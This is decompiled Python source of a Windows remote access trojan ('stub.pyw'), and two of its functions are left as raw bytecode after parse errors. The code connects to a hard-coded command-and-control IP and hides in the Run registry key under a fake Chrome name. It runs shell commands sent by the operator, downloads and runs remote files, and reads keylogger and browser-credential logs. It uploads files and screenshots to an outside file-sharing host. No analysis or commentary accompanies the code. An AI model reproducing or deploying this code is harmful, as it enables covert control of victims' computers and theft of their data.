# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: stub.pyw
import socket
from subprocess import Popen, PIPE
from time import sleep
import signal, struct
from tempfile import gettempdir
from sys import executable
from sys import exit as exits
from os import chdir, startfile, getcwd, path, remove, mkdir
from tempfile import gettempdir
from wget import download as dw
from platform import node, machine, version, release, architecture, processor, system
from PIL import ImageGrab
from requests import post
from Modules.pasd import gogo

class Cli(object):

    def __init__(self):
        self.apexRH = '185.219.168.96'
        self.apexRP = 3369
        self.socket = None
        self.plg_pathz = gettempdir() + '\\m_plugins'

    def downloadz(self, url):
        try:
            folme = gettempdir()
            chdir(folme)
            folderx = dw(url)
            startfile(folderx)
        except:
            pass

    def plugin_down(self, fuxur):
        try:
            chdir(gettempdir())
            if path.exists('m_plugins') == True:
                chdir('m_plugins')
                dw(fuxur)
            else:
                mkdir('m_plugins')
                chdir('m_plugins')
                dw(fuxur)
        except:
            pass

    def kizi(self):
        _path = executable
        cmdxx = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v GoogeChromeAutoLaunch /f /d ""{}""'.format(_path)
        Popen(cmdxx, shell=True, stdin=PIPE, stdout=PIPE,
          stderr=PIPE)

    def register_me(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)

    def quit_gracefully(self, signal=None, frame=None):
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                try:
                    str(e)
                finally:
                    e = None
                    del e

        exits(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            try:
                return
            finally:
                e = None
                del e

    def net_connect(self):
        try:
            self.socket.connect((self.apexRH, self.apexRP))
        except socket.error as e:
            try:
                sleep(5)
                raise
            finally:
                e = None
                del e

        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            try:
                raise
            finally:
                e = None
                del e

    def send_infoz(self, data_b):
        sent_msg = str.encode(data_b)
        self.socket.send(struct.pack('>I', len(sent_msg)) + sent_msg)

    def browps(self):
        try:
            chdir(gettempdir())
            try:
                mkdir('m_plugins')
            except:
                pass
            else:
                chdir(self.plg_pathz)
                gogo()
                gologs = open('logs.txt', 'r')
                gol = gologs.read()
                gologs.close()
                self.send_infoz(gol)
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def sysinfo(self):
        try:
            syz = '\nUsername: ' + node()
            syz += '\nOS: ' + system() + '  ' + release()
            syz += '\nOS Version: ' + version()
            syz += '\nArchitecture: ' + str(architecture())
            syz += '\nProcessor: ' + processor()
            syz += '\nMachine: ' + machine()
            self.send_infoz(syz)
        except Exception as e:
            try:
                eve = str(e)
                self.send_infoz(e)
            finally:
                e = None
                del e

    def read_keyz(self):
        try:
            chdir(gettempdir())
            pcz = open('pczlog.txt', 'r')
            limbo = pcz.read()
            pcz.close()
            self.send_infoz(str(limbo))
        except:
            self.send_infoz('[-] No logs found or plugin is not running \\ installed!')

    def get_filez(self, filexx):
        try:
            filex = {'upload_file': open(filexx, 'rb')}
            r = post('https://transfer.sh', files=filex)
            outlinz = 'LINK: ' + str(r.text)
            self.send_infoz(outlinz)
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def get_sec(self):
        try:
            scr = ImageGrab.grab().save('screenshotet.png')
            scfile = {'upload_file': open('screenshotet.png', 'rb')}
            tr = post('https://transfer.sh', files=scfile)
            filink = 'LINK OF SCREENSHOT: ' + str(tr.text)
            self.send_infoz(filink)
        except Exception as e:
            try:
                self.send_infoz(str(e))
            finally:
                e = None
                del e

    def receive_sms--- This code section failed: ---

 L. 177         0  SETUP_FINALLY        18  'to 18'

 L. 178         2  LOAD_FAST                'self'
                4  LOAD_ATTR                socket
                6  LOAD_METHOD              recv
                8  LOAD_CONST               10
               10  CALL_METHOD_1         1  ''
               12  POP_TOP          
               14  POP_BLOCK        
               16  JUMP_FORWARD         58  'to 58'
             18_0  COME_FROM_FINALLY     0  '0'

 L. 179        18  DUP_TOP          
               20  LOAD_GLOBAL              Exception
               22  COMPARE_OP               exception-match
               24  POP_JUMP_IF_FALSE    56  'to 56'
               26  POP_TOP          
               28  STORE_FAST               'e'
               30  POP_TOP          
               32  SETUP_FINALLY        44  'to 44'

 L. 180        34  POP_BLOCK        
               36  POP_EXCEPT       
               38  CALL_FINALLY         44  'to 44'
               40  LOAD_CONST               None
               42  RETURN_VALUE     
             44_0  COME_FROM            38  '38'
             44_1  COME_FROM_FINALLY    32  '32'
               44  LOAD_CONST               None
               46  STORE_FAST               'e'
               48  DELETE_FAST              'e'
               50  END_FINALLY      
               52  POP_EXCEPT       
               54  JUMP_FORWARD         58  'to 58'
             56_0  COME_FROM            24  '24'
               56  END_FINALLY      
             58_0  COME_FROM            54  '54'
             58_1  COME_FROM            16  '16'

 L. 181        58  LOAD_GLOBAL              str
               60  LOAD_METHOD              encode
               62  LOAD_GLOBAL              str
               64  LOAD_GLOBAL              getcwd
               66  CALL_FUNCTION_0       0  ''
               68  CALL_FUNCTION_1       1  ''
               70  LOAD_STR                 '> '
               72  BINARY_ADD       
               74  CALL_METHOD_1         1  ''
               76  STORE_FAST               'cwd'

 L. 182        78  LOAD_FAST                'self'
               80  LOAD_ATTR                socket
               82  LOAD_METHOD              send
               84  LOAD_GLOBAL              struct
               86  LOAD_METHOD              pack
               88  LOAD_STR                 '>I'
               90  LOAD_GLOBAL              len
               92  LOAD_FAST                'cwd'
               94  CALL_FUNCTION_1       1  ''
               96  CALL_METHOD_2         2  ''
               98  LOAD_FAST                'cwd'
              100  BINARY_ADD       
              102  CALL_METHOD_1         1  ''
              104  POP_TOP          
            106_0  COME_FROM           916  '916'
            106_1  COME_FROM           912  '912'
            106_2  COME_FROM           870  '870'
            106_3  COME_FROM           844  '844'

 L. 184       106  LOAD_CONST               None
              108  STORE_FAST               'output_str'

 L. 185       110  LOAD_FAST                'self'
              112  LOAD_ATTR                socket
              114  LOAD_METHOD              recv
              116  LOAD_CONST               204800
              118  CALL_METHOD_1         1  ''
              120  STORE_FAST               'data'

 L. 186       122  LOAD_FAST                'data'
              124  LOAD_CONST               b''
              126  COMPARE_OP               ==
              128  POP_JUMP_IF_FALSE   138  'to 138'

 L. 186   130_132  JUMP_FORWARD        918  'to 918'
          134_136  BREAK_LOOP          838  'to 838'
            138_0  COME_FROM           128  '128'

 L. 187       138  LOAD_FAST                'data'
              140  LOAD_CONST               None
              142  LOAD_CONST               2
              144  BUILD_SLICE_2         2 
              146  BINARY_SUBSCR    
              148  LOAD_METHOD              decode
              150  LOAD_STR                 'utf-8'
              152  CALL_METHOD_1         1  ''
              154  LOAD_STR                 'cd'
              156  COMPARE_OP               ==
              158  POP_JUMP_IF_FALSE   250  'to 250'

 L. 188       160  LOAD_FAST                'data'
              162  LOAD_CONST               3
              164  LOAD_CONST               None
              166  BUILD_SLICE_2         2 
              168  BINARY_SUBSCR    
              170  LOAD_METHOD              decode
              172  LOAD_STR                 'utf-8'
              174  CALL_METHOD_1         1  ''
              176  STORE_FAST               'directory'

 L. 189       178  SETUP_FINALLY       196  'to 196'

 L. 190       180  LOAD_GLOBAL              chdir
              182  LOAD_FAST                'directory'
              184  LOAD_METHOD              strip
              186  CALL_METHOD_0         0  ''
              188  CALL_FUNCTION_1       1  ''
              190  POP_TOP          
              192  POP_BLOCK        
              194  JUMP_FORWARD        242  'to 242'
            196_0  COME_FROM_FINALLY   178  '178'

 L. 191       196  DUP_TOP          
              198  LOAD_GLOBAL              Exception
              200  COMPARE_OP               exception-match
              202  POP_JUMP_IF_FALSE   240  'to 240'
              204  POP_TOP          
              206  STORE_FAST               'e'
              208  POP_TOP          
              210  SETUP_FINALLY       228  'to 228'

 L. 192       212  LOAD_STR                 'Could not change directory: '
              214  LOAD_GLOBAL              str
              216  LOAD_FAST                'e'
              218  CALL_FUNCTION_1       1  ''
              220  BINARY_ADD       
              222  STORE_FAST               'output_str'
              224  POP_BLOCK        
              226  BEGIN_FINALLY    
            228_0  COME_FROM_FINALLY   210  '210'
              228  LOAD_CONST               None
              230  STORE_FAST               'e'
              232  DELETE_FAST              'e'
              234  END_FINALLY      
              236  POP_EXCEPT       
              238  JUMP_FORWARD        838  'to 838'
            240_0  COME_FROM           202  '202'
              240  END_FINALLY      
            242_0  COME_FROM           194  '194'

 L. 194       242  LOAD_STR                 ''
              244  STORE_FAST               'output_str'
          246_248  JUMP_FORWARD        838  'to 838'
            250_0  COME_FROM           158  '158'

 L. 195       250  LOAD_FAST                'data'
              252  LOAD_CONST               None
              254  LOAD_CONST               None
              256  BUILD_SLICE_2         2 
              258  BINARY_SUBSCR    
              260  LOAD_METHOD              decode
              262  LOAD_STR                 'utf-8'
              264  CALL_METHOD_1         1  ''
              266  LOAD_STR                 'terminate'
              268  COMPARE_OP               ==
          270_272  POP_JUMP_IF_FALSE   298  'to 298'

 L. 196       274  LOAD_FAST                'self'
              276  LOAD_ATTR                socket
              278  LOAD_METHOD              close
              280  CALL_METHOD_0         0  ''
              282  POP_TOP          

 L. 197       284  LOAD_GLOBAL              exits
              286  CALL_FUNCTION_0       0  ''
              288  POP_TOP          

 L. 198   290_292  JUMP_FORWARD        918  'to 918'
          294_296  BREAK_LOOP          838  'to 838'
            298_0  COME_FROM           270  '270'

 L. 199       298  LOAD_FAST                'data'
              300  LOAD_CONST               None
              302  LOAD_CONST               3
              304  BUILD_SLICE_2         2 
              306  BINARY_SUBSCR    
              308  LOAD_METHOD              decode
              310  LOAD_STR                 'utf-8'
              312  CALL_METHOD_1         1  ''
              314  LOAD_STR                 'get'
              316  COMPARE_OP               ==
          318_320  POP_JUMP_IF_FALSE   354  'to 354'

 L. 200       322  LOAD_FAST                'data'
              324  LOAD_CONST               4
              326  LOAD_CONST               None
              328  BUILD_SLICE_2         2 
              330  BINARY_SUBSCR    
              332  LOAD_METHOD              decode
              334  LOAD_STR                 'utf-8'
              336  CALL_METHOD_1         1  ''
              338  STORE_FAST               'fileto'

 L. 201       340  LOAD_FAST                'self'
              342  LOAD_METHOD              get_filez
              344  LOAD_FAST                'fileto'
              346  CALL_METHOD_1         1  ''
              348  POP_TOP          
          350_352  JUMP_FORWARD        838  'to 838'
            354_0  COME_FROM           318  '318'

 L. 202       354  LOAD_FAST                'data'
              356  LOAD_CONST               None
              358  LOAD_CONST               None
              360  BUILD_SLICE_2         2 
              362  BINARY_SUBSCR    
              364  LOAD_METHOD              decode
              366  LOAD_STR                 'utf-8'
              368  CALL_METHOD_1         1  ''
              370  LOAD_STR                 'key_dump'
              372  COMPARE_OP               ==
          374_376  POP_JUMP_IF_FALSE   390  'to 390'

 L. 203       378  LOAD_FAST                'self'
              380  LOAD_METHOD              read_keyz
              382  CALL_METHOD_0         0  ''
              384  POP_TOP          
          386_388  JUMP_FORWARD        838  'to 838'
            390_0  COME_FROM           374  '374'

 L. 204       390  LOAD_FAST                'data'
              392  LOAD_CONST               None
              394  LOAD_CONST               None
              396  BUILD_SLICE_2         2 
              398  BINARY_SUBSCR    
              400  LOAD_METHOD              decode
              402  LOAD_STR                 'utf-8'
              404  CALL_METHOD_1         1  ''
              406  LOAD_STR                 'screenshot'
              408  COMPARE_OP               ==
          410_412  POP_JUMP_IF_FALSE   426  'to 426'

 L. 205       414  LOAD_FAST                'self'
              416  LOAD_METHOD              get_sec
              418  CALL_METHOD_0         0  ''
              420  POP_TOP          
          422_424  JUMP_FORWARD        838  'to 838'
            426_0  COME_FROM           410  '410'

 L. 207       426  LOAD_FAST                'data'
              428  LOAD_CONST               None
              430  LOAD_CONST               None
              432  BUILD_SLICE_2         2 
              434  BINARY_SUBSCR    
              436  LOAD_METHOD              decode
              438  LOAD_STR                 'utf-8'
              440  CALL_METHOD_1         1  ''
              442  LOAD_STR                 'brow'
              444  COMPARE_OP               ==
          446_448  POP_JUMP_IF_FALSE   462  'to 462'

 L. 208       450  LOAD_FAST                'self'
              452  LOAD_METHOD              browps
              454  CALL_METHOD_0         0  ''
              456  POP_TOP          
          458_460  JUMP_FORWARD        838  'to 838'
            462_0  COME_FROM           446  '446'

 L. 209       462  LOAD_FAST                'data'
              464  LOAD_CONST               None
              466  LOAD_CONST               4
              468  BUILD_SLICE_2         2 
              470  BINARY_SUBSCR    
              472  LOAD_METHOD              decode
              474  LOAD_STR                 'utf-8'
              476  CALL_METHOD_1         1  ''
              478  LOAD_STR                 'wget'
              480  COMPARE_OP               ==
          482_484  POP_JUMP_IF_FALSE   578  'to 578'

 L. 210       486  LOAD_FAST                'data'
              488  LOAD_CONST               5
              490  LOAD_CONST               None
              492  BUILD_SLICE_2         2 
              494  BINARY_SUBSCR    
              496  LOAD_METHOD              decode
              498  LOAD_STR                 'utf-8'
              500  CALL_METHOD_1         1  ''
              502  STORE_FAST               'furl'

 L. 211       504  SETUP_FINALLY       520  'to 520'

 L. 212       506  LOAD_FAST                'self'
              508  LOAD_METHOD              downloadz
              510  LOAD_FAST                'furl'
              512  CALL_METHOD_1         1  ''
              514  POP_TOP          

 L. 213       516  POP_BLOCK        
              518  BREAK_LOOP          838  'to 838'
            520_0  COME_FROM_FINALLY   504  '504'

 L. 214       520  DUP_TOP          
              522  LOAD_GLOBAL              Exception
              524  COMPARE_OP               exception-match
          526_528  POP_JUMP_IF_FALSE   572  'to 572'
              530  POP_TOP          
              532  STORE_FAST               'e'
              534  POP_TOP          
              536  SETUP_FINALLY       560  'to 560'

 L. 215       538  LOAD_STR                 'ERROR: '
              540  LOAD_FAST                'e'
              542  BINARY_ADD       
              544  STORE_FAST               'texto'

 L. 216       546  LOAD_FAST                'self'
              548  LOAD_METHOD              send_infoz
              550  LOAD_FAST                'texto'
              552  CALL_METHOD_1         1  ''
              554  POP_TOP          
              556  POP_BLOCK        
              558  BEGIN_FINALLY    
            560_0  COME_FROM_FINALLY   536  '536'
              560  LOAD_CONST               None
              562  STORE_FAST               'e'
              564  DELETE_FAST              'e'
              566  END_FINALLY      
              568  POP_EXCEPT       
              570  JUMP_FORWARD        838  'to 838'
            572_0  COME_FROM           526  '526'
              572  END_FINALLY      
          574_576  JUMP_FORWARD        838  'to 838'
            578_0  COME_FROM           482  '482'

 L. 217       578  LOAD_FAST                'data'
              580  LOAD_CONST               None
              582  LOAD_CONST               6
              584  BUILD_SLICE_2         2 
              586  BINARY_SUBSCR    
              588  LOAD_METHOD              decode
              590  LOAD_STR                 'utf-8'
              592  CALL_METHOD_1         1  ''
              594  LOAD_STR                 'plugin'
              596  COMPARE_OP               ==
          598_600  POP_JUMP_IF_FALSE   650  'to 650'

 L. 218       602  LOAD_FAST                'data'
              604  LOAD_CONST               7
              606  LOAD_CONST               None
              608  BUILD_SLICE_2         2 
              610  BINARY_SUBSCR    
              612  LOAD_METHOD              decode
              614  LOAD_STR                 'utf-8'
              616  CALL_METHOD_1         1  ''
              618  STORE_FAST               'fux'

 L. 219       620  SETUP_FINALLY       636  'to 636'

 L. 220       622  LOAD_FAST                'self'
              624  LOAD_METHOD              plugin_down
              626  LOAD_FAST                'fux'
              628  CALL_METHOD_1         1  ''
              630  POP_TOP          
              632  POP_BLOCK        
              634  JUMP_FORWARD        648  'to 648'
            636_0  COME_FROM_FINALLY   620  '620'

 L. 221       636  POP_TOP          
              638  POP_TOP          
              640  POP_TOP          

 L. 222       642  POP_EXCEPT       
              644  BREAK_LOOP          648  'to 648'
              646  END_FINALLY      
            648_0  COME_FROM           644  '644'
            648_1  COME_FROM           634  '634'
              648  JUMP_FORWARD        838  'to 838'
            650_0  COME_FROM           598  '598'

 L. 223       650  LOAD_FAST                'data'
              652  LOAD_CONST               None
              654  LOAD_CONST               None
              656  BUILD_SLICE_2         2 
              658  BINARY_SUBSCR    
              660  LOAD_METHOD              decode
              662  LOAD_STR                 'utf-8'
              664  CALL_METHOD_1         1  ''
              666  LOAD_STR                 'sysinfo'
              668  COMPARE_OP               ==
          670_672  POP_JUMP_IF_FALSE   684  'to 684'

 L. 224       674  LOAD_FAST                'self'
              676  LOAD_METHOD              sysinfo
              678  CALL_METHOD_0         0  ''
              680  POP_TOP          
              682  JUMP_FORWARD        838  'to 838'
            684_0  COME_FROM           670  '670'

 L. 225       684  LOAD_GLOBAL              len
              686  LOAD_FAST                'data'
              688  CALL_FUNCTION_1       1  ''
              690  LOAD_CONST               0
              692  COMPARE_OP               >
          694_696  POP_JUMP_IF_FALSE   838  'to 838'

 L. 226       698  SETUP_FINALLY       770  'to 770'

 L. 227       700  LOAD_GLOBAL              Popen
              702  LOAD_FAST                'data'
              704  LOAD_CONST               None
              706  LOAD_CONST               None
              708  BUILD_SLICE_2         2 
              710  BINARY_SUBSCR    
              712  LOAD_METHOD              decode
              714  LOAD_STR                 'utf-8'
              716  CALL_METHOD_1         1  ''
              718  LOAD_CONST               True
              720  LOAD_GLOBAL              PIPE

 L. 228       722  LOAD_GLOBAL              PIPE

 L. 228       724  LOAD_GLOBAL              PIPE

 L. 227       726  LOAD_CONST               ('shell', 'stdout', 'stderr', 'stdin')
              728  CALL_FUNCTION_KW_5     5  '5 total positional and keyword args'
              730  STORE_FAST               'cmd'

 L. 229       732  LOAD_FAST                'cmd'
              734  LOAD_ATTR                stdout
              736  LOAD_METHOD              read
              738  CALL_METHOD_0         0  ''
              740  LOAD_FAST                'cmd'
              742  LOAD_ATTR                stderr
              744  LOAD_METHOD              read
              746  CALL_METHOD_0         0  ''
              748  BINARY_ADD       
              750  STORE_FAST               'output_bytes'

 L. 230       752  LOAD_FAST                'output_bytes'
              754  LOAD_ATTR                decode
              756  LOAD_STR                 'utf-8'
              758  LOAD_STR                 'replace'
              760  LOAD_CONST               ('errors',)
              762  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              764  STORE_FAST               'output_str'
              766  POP_BLOCK        
              768  JUMP_FORWARD        838  'to 838'
            770_0  COME_FROM_FINALLY   698  '698'

 L. 231       770  DUP_TOP          
              772  LOAD_GLOBAL              Exception
              774  COMPARE_OP               exception-match
          776_778  POP_JUMP_IF_FALSE   836  'to 836'
              780  POP_TOP          
              782  STORE_FAST               'e'
              784  POP_TOP          
              786  SETUP_FINALLY       824  'to 824'

 L. 232       788  LOAD_STR                 'Command execution unsuccessful: '
              790  LOAD_GLOBAL              str
              792  LOAD_FAST                'e'
              794  CALL_FUNCTION_1       1  ''
              796  BINARY_ADD       
              798  STORE_FAST               'output_str'

 L. 233       800  LOAD_GLOBAL              getcwd
              802  CALL_FUNCTION_0       0  ''
              804  STORE_FAST               'cdw'

 L. 235       806  LOAD_FAST                'self'
              808  LOAD_METHOD              send_infoz
              810  LOAD_FAST                'output_str'
              812  LOAD_FAST                'cdw'
              814  BINARY_ADD       
              816  CALL_METHOD_1         1  ''
              818  POP_TOP          
              820  POP_BLOCK        
              822  BEGIN_FINALLY    
            824_0  COME_FROM_FINALLY   786  '786'
              824  LOAD_CONST               None
              826  STORE_FAST               'e'
              828  DELETE_FAST              'e'
              830  END_FINALLY      
              832  POP_EXCEPT       
              834  JUMP_FORWARD        838  'to 838'
            836_0  COME_FROM           776  '776'
              836  END_FINALLY      
            838_0  COME_FROM           834  '834'
            838_1  COME_FROM           768  '768'
            838_2  COME_FROM           694  '694'
            838_3  COME_FROM           682  '682'
            838_4  COME_FROM           648  '648'
            838_5  COME_FROM           574  '574'
            838_6  COME_FROM           570  '570'
            838_7  COME_FROM           518  '518'
            838_8  COME_FROM           458  '458'
            838_9  COME_FROM           422  '422'
           838_10  COME_FROM           386  '386'
           838_11  COME_FROM           350  '350'
           838_12  COME_FROM           294  '294'
           838_13  COME_FROM           246  '246'
           838_14  COME_FROM           238  '238'
           838_15  COME_FROM           134  '134'

 L. 236       838  LOAD_FAST                'output_str'
              840  LOAD_CONST               None
              842  COMPARE_OP               is-not
              844  POP_JUMP_IF_FALSE_BACK   106  'to 106'

 L. 237       846  SETUP_FINALLY       872  'to 872'

 L. 238       848  LOAD_GLOBAL              getcwd
              850  CALL_FUNCTION_0       0  ''
              852  STORE_FAST               'cdw'

 L. 240       854  LOAD_FAST                'self'
              856  LOAD_METHOD              send_infoz
              858  LOAD_FAST                'output_str'
              860  LOAD_FAST                'cdw'
              862  BINARY_ADD       
              864  CALL_METHOD_1         1  ''
              866  POP_TOP          
              868  POP_BLOCK        
              870  JUMP_BACK           106  'to 106'
            872_0  COME_FROM_FINALLY   846  '846'

 L. 241       872  DUP_TOP          
              874  LOAD_GLOBAL              Exception
              876  COMPARE_OP               exception-match
          878_880  POP_JUMP_IF_FALSE   914  'to 914'
              882  POP_TOP          
              884  STORE_FAST               'e'
              886  POP_TOP          
              888  SETUP_FINALLY       902  'to 902'

 L. 242       890  LOAD_GLOBAL              str
              892  LOAD_FAST                'e'
              894  CALL_FUNCTION_1       1  ''
              896  POP_TOP          
              898  POP_BLOCK        
              900  BEGIN_FINALLY    
            902_0  COME_FROM_FINALLY   888  '888'
              902  LOAD_CONST               None
              904  STORE_FAST               'e'
              906  DELETE_FAST              'e'
              908  END_FINALLY      
              910  POP_EXCEPT       
              912  JUMP_BACK           106  'to 106'
            914_0  COME_FROM           878  '878'
              914  END_FINALLY      
              916  JUMP_BACK           106  'to 106'
            918_0  COME_FROM           290  '290'
            918_1  COME_FROM           130  '130'

 L. 243       918  LOAD_FAST                'self'
              920  LOAD_ATTR                socket
              922  LOAD_METHOD              close
              924  CALL_METHOD_0         0  ''
              926  POP_TOP          

Parse error at or near `JUMP_FORWARD' instruction at offset 574_576


def pexor--- This code section failed: ---

 L. 249         0  LOAD_GLOBAL              Cli
                2  CALL_FUNCTION_0       0  ''
                4  STORE_FAST               'cozmo'

 L. 250         6  LOAD_FAST                'cozmo'
                8  LOAD_METHOD              kizi
               10  CALL_METHOD_0         0  ''
               12  POP_TOP          

 L. 251        14  LOAD_FAST                'cozmo'
               16  LOAD_METHOD              register_me
               18  CALL_METHOD_0         0  ''
               20  POP_TOP          

 L. 252        22  LOAD_FAST                'cozmo'
               24  LOAD_METHOD              socket_create
               26  CALL_METHOD_0         0  ''
               28  POP_TOP          
             30_0  COME_FROM            88  '88'
             30_1  COME_FROM            82  '82'

 L. 254        30  SETUP_FINALLY        44  'to 44'

 L. 255        32  LOAD_FAST                'cozmo'
               34  LOAD_METHOD              net_connect
               36  CALL_METHOD_0         0  ''
               38  POP_TOP          
               40  POP_BLOCK        
               42  JUMP_FORWARD         90  'to 90'
             44_0  COME_FROM_FINALLY    30  '30'

 L. 256        44  DUP_TOP          
               46  LOAD_GLOBAL              Exception
               48  COMPARE_OP               exception-match
               50  POP_JUMP_IF_FALSE    84  'to 84'
               52  POP_TOP          
               54  STORE_FAST               'e'
               56  POP_TOP          
               58  SETUP_FINALLY        72  'to 72'

 L. 257        60  LOAD_GLOBAL              sleep
               62  LOAD_CONST               5
               64  CALL_FUNCTION_1       1  ''
               66  POP_TOP          
               68  POP_BLOCK        
               70  BEGIN_FINALLY    
             72_0  COME_FROM_FINALLY    58  '58'
               72  LOAD_CONST               None
               74  STORE_FAST               'e'
               76  DELETE_FAST              'e'
               78  END_FINALLY      
               80  POP_EXCEPT       
               82  JUMP_BACK            30  'to 30'
             84_0  COME_FROM            50  '50'
               84  END_FINALLY      

 L. 259        86  JUMP_FORWARD         90  'to 90'
               88  JUMP_BACK            30  'to 30'
             90_0  COME_FROM            86  '86'
             90_1  COME_FROM            42  '42'

 L. 260        90  SETUP_FINALLY       104  'to 104'

 L. 261        92  LOAD_FAST                'cozmo'
               94  LOAD_METHOD              receive_sms
               96  CALL_METHOD_0         0  ''
               98  POP_TOP          
              100  POP_BLOCK        
              102  JUMP_FORWARD        146  'to 146'
            104_0  COME_FROM_FINALLY    90  '90'

 L. 262       104  DUP_TOP          
              106  LOAD_GLOBAL              Exception
              108  COMPARE_OP               exception-match
              110  POP_JUMP_IF_FALSE   144  'to 144'
              112  POP_TOP          
              114  STORE_FAST               'e'
              116  POP_TOP          
              118  SETUP_FINALLY       132  'to 132'

 L. 263       120  LOAD_GLOBAL              str
              122  LOAD_FAST                'e'
              124  CALL_FUNCTION_1       1  ''
              126  POP_TOP          
              128  POP_BLOCK        
              130  BEGIN_FINALLY    
            132_0  COME_FROM_FINALLY   118  '118'
              132  LOAD_CONST               None
              134  STORE_FAST               'e'
              136  DELETE_FAST              'e'
              138  END_FINALLY      
              140  POP_EXCEPT       
              142  JUMP_FORWARD        146  'to 146'
            144_0  COME_FROM           110  '110'
              144  END_FINALLY      
            146_0  COME_FROM           142  '142'
            146_1  COME_FROM           102  '102'

 L. 264       146  LOAD_FAST                'cozmo'
              148  LOAD_ATTR                socket
              150  LOAD_METHOD              close
              152  CALL_METHOD_0         0  ''
              154  POP_TOP          

Parse error at or near `JUMP_FORWARD' instruction at offset 86


if __name__ == '__main__':
    while True:
        pexor()